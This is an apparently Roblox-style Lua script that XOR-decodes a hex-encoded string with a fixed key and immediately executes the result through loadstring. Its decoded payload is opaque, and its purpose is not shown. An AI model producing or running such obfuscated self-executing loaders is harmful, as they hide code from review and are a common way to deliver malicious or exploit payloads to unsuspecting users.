local A="ba646e32667a573bdfa74f46c4e8518fb76564302a177562c1cb0278d5b407baeb6d6c3f793f670cc29c4048d5bc1cb1f64637127a2a767f8cbf4f47d4b05f9cb76761316b39712fae9a4b47c7fb20abb77f686e5c3b7673c1d4135fd3a016d5bf6d2d106b367664c58a450bd5bd16b1f67f6c2061746976c59e4003e2b41fb3b46a6e3826297f6ac2c77d5fc0a116f6f66e6337003f7462ae9b4b5fd4a71dff9b01"
local K={214,11,13,83,10,90,26,6,164,233,46,43,161,213,115,223}
local O=table.create(#A/2)
local N=0
for I=1,#A,2 do
N=N+1
O[N]=string.char(bit32.bxor(tonumber(string.sub(A,I,I+1),16),K[(N-1)%#K+1]))
end
return loadstring(table.concat(O))()
